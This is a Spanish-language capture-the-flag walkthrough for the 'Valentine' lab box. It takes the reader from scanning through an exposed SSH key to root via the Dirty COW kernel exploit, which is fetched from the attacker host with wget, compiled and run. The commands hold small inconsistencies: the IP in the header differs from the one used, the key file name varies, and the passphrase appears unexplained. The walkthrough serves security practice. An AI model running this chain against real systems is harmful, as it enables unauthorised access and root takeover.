- Maquina: Linux
- Level: Easy
- IP: 10.10.10.179

## Herramientas a utilizar:

- nmap
- gobuster
- searchsploit 
```
nmap -sC -sV -n -o scan_Valentine.txt 10.10.10.79
```

```
gobuster dir -u http://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
```

>Encontraremos el directorio /dev el cual contiene dos archivo.
hyper_key
note.txt

hyper_key es un archivo que esta en Hexadecimal por lo que haremos lo siguiente:

```
wget https://10.10.10.79/dev/hype_key --no-check-certificate
cat hype_key | xxd -r -p 
cat hype_key | xxd -r -p > hype_key_encrypted
openssl rsa -in hype_key_encrypted -out hype_key_decrypted
```
Pedira un password y le pondremos el siguiente: heartbleedbelievethehype

Ahora ya tenemos como acceder via ssh

```
ssh -i hype_key_decrypted hype@10.10.10.79
```

Ahora ya estamos como hype en valentine, solo seria leer user flag con

```
cat Desktop/user.txt
```
o tambien podemos hacer una busqueda con
```
find . -name user.txt -exec wc -c {} \; -exec cat {} \;
```
Ahora a buscar el root.txt.
```
uname -a
```
```
searchsploit dirty
```
En la busqueda vamos a probar el siguiente:
`Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Conditi | linux/local/40839.c`
```
searchsploit -m exploits/linux/local/40839.c
```
Cambiamos de nombre el exploit
```
mv 40839.c dc.c
python3 -m http.server 80
```

En otra terminal debemos subir dicho exploit a hype.
```
ssh -i hype_key_decrypted hype@10.10.10.79
```

Ahora vamos al directorio /dev/shm/
```
wget http://10.10.14.17/dc.c
```
Copilamos el archivo y hacemos un output a c
```
gcc -pthread dc.c -o c -lcrypt
```
Ejecutamos c
```
./c
```
Pedirar un password > ponemos cualquiera, luego habra un archivo llamado firefart
```
su firefart 
```
Pedira el password que ya hemos puesto anteriormente.
```
id
```
y listo ahora tenemos privilegios de root.
Solo debemos hacer `cat /root/root.txt` y tenemos nuestra flag.
